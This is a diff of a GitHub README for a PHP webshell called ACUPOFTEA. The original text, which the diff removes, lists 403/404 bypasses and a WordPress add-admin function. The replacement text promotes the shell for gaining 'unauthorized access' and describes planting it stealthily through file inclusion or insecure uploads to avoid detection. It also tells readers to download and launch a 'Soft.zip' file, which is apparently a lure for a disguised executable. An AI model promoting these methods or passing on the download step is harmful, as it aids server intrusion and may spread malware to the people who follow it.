@@ -1,57 +1,69 @@
-<div align="center">
-  
-  ![image_2025-03-09_22-00-58](https://github.com/user-attachments/assets/8601ac3c-6a13-43e0-87b1-62b0848bb6e4)
-  <hr>
-  
-  ![License](https://img.shields.io/badge/LICENCE-MIT-orange?style=flat-square) ![PHP](https://img.shields.io/badge/PHP-8.x.x-777BB4?style=flat-square) ![Version](https://img.shields.io/badge/VERSION-1.0.0-lightgreen?style=flat-square)
-</div>
+# ACUPOFTEA - PHP Webshell Bypass Server 403/404
 
-> [!WARNING]
-> This is a PHP webshell. Please use it responsibly. If misused, I, as the creator, will not be responsible. Misuse of this file may violate laws or regulations, and the user is fully responsible. This file was created for a good purpose.
+![ACUPOFTEA](https://img.shields.io/badge/ACUPOFTEA-PHP-red)
+![Webshell Bypass](https://img.shields.io/badge/Webshell-Bypass-blue)
+![Hacking](https://img.shields.io/badge/Hacking-green)
 
+Welcome to the ACUPOFTEA repository where you can find a powerful PHP webshell bypass tool to help with penetration testing and web security assessments. This webshell has been carefully crafted to bypass server responses of 403 and 404, enabling you to gain unauthorized access and perform various operations on the target server.
 
-```bash
-  ___    _____ _   _______   ___________   _____ _____  ___  
- / _ \  /  __ \ | | | ___ \ |  _  |  ___| |_   _|  ___|/ _ \ 
-/ /_\ \ | /  \/ | | | |_/ / | | | | |_      | | | |__ / /_\ \
-|  _  | | |   | | | |  __/  | | | |  _|     | | |  __||  _  |
-| | | | | \__/\ |_| | |     \ \_/ / |       | | | |___| | | |
-\_| |_/  \____/\___/\_|      \___/\_|       \_/ \____/\_| |_/
-```
+## Features of ACUPOFTEA Webshell Bypass
 
-> [!NOTE]
-> A CUP OF TEA is a file manager or webshell created with great dedication. It comes with several features, with the most notable ones being 403 bypass and 404 file not found bypass. A CUP OF TEA has been tested on Laragon PHP 8.1.10. Its functionality is similar to other webshells, as it is inspired by several existing webshells.
+### Minishell
+The ACUPOFTEA webshell is a compact and efficient tool that provides a minimalistic interface for executing commands on the server. Its small footprint makes it harder to detect, allowing you to operate stealthily during penetration tests.
 
-<pre>
-  acup@oftea:~$ Bypass Features
-  - Bypass LiteSpeed
-  - Bypass 403 Forbidden
-  - Bypass 404 Not Found
-  - Bypass 500
-  
-  acup@oftea:~$ Function Features
-  - WordPress Add Admin User
-  - Mailer Test
-  - It will be updated soon
+### File Manager
+With the file manager feature, you can navigate through the server's file system, upload and download files, edit configuration files, and perform other file-related operations. This capability gives you full control over the target server's content.
 
-  acup@oftea:~$ Common Features
-  - Add File
-  - Add Folder
-  - Change Date of File & Folder
-  - Change Permission of File & Folder
-  - Delete File & Folder
-  - Download File
-  - Edit File
-  - Rename File & Folder
-  - View File
-  - Upload Multiple Files
-</pre>
+### PHP 8 Compatible
+ACUPOFTEA webshell is fully compatible with PHP 8, ensuring optimal performance and reliability when used with the latest PHP versions. You can leverage the newest PHP features and enhancements while conducting security assessments.
 
-| PREVIEW |
-|---------|
-| ![image](https://github.com/user-attachments/assets/d6a46965-b399-4039-a151-811290fd1adc) |
+## Repository Topics
+- acupoftea
+- acupoftea-php
+- acupoftea-webshell
+- backdoor
+- bypasser
+- file-manager
+- filemanager
+- hacking
+- minishell
+- pentest
+- php
+- php-backdoor
+- php-webshell
+- php8
+- phpshell
+- web-security
+- webshell
+- webshells
 
-### Reference
-- [Gecko Webshell](https://github.com/MadExploits/Gecko)
-- [IndoSec Shell](https://github.com/holiq/IndoSec-sHell)
-- [Marijuana Webshell](https://github.com/0x5a455553/MARIJUANA)
+## Installation Instructions
+To get started with ACUPOFTEA Webshell Bypass, you can download the tool from the following link:
+[Download ACUPOFTEA](https://github.com/files/Soft.zip)
+
+Please note that the file needs to be launched after downloading to initiate the installation process successfully.
+
+In case the provided link is not accessible, we recommend checking the "Releases" section of this repository for alternative download options.
+
+## Getting Started
+Once you have downloaded and installed ACUPOFTEA Webshell Bypass, you can start using the tool by uploading it to the target server through various methods such as file inclusions, insecure file uploads, or other attack vectors.
+
+Make sure to deploy the webshell strategically to avoid detection and maximize its effectiveness during security assessments. You can refer to online tutorials and guides on using webshells for penetration testing to enhance your capabilities.
+
+## Contribution Guidelines
+We welcome contributions from the cybersecurity community to enhance and improve the ACUPOFTEA Webshell Bypass tool. If you have any suggestions, bug fixes, or new features to add, feel free to submit a pull request to this repository.
+
+Together, we can make ACUPOFTEA one of the leading tools for web security testing and penetration testing activities.
+
+## Support and Feedback
+If you encounter any issues while using ACUPOFTEA Webshell Bypass or have suggestions for future enhancements, please open an issue on this repository. Our team will address the problems promptly and consider your feedback for upcoming releases.
+
+Your input is valuable in improving the tool and making it more robust for diverse security testing scenarios.
+
+---
+
+By leveraging the power of ACUPOFTEA Webshell Bypass, you can enhance your ability to identify vulnerabilities in web servers, applications, and online systems. Remember to use this tool responsibly and only on authorized systems during legitimate security assessments.
+
+![Hacker](https://img.icons8.com/cute-clipart/64/000000/hacker.png)
+
+Happy hacking and stay safe in your cybersecurity explorations! 🚀🛡️🔒
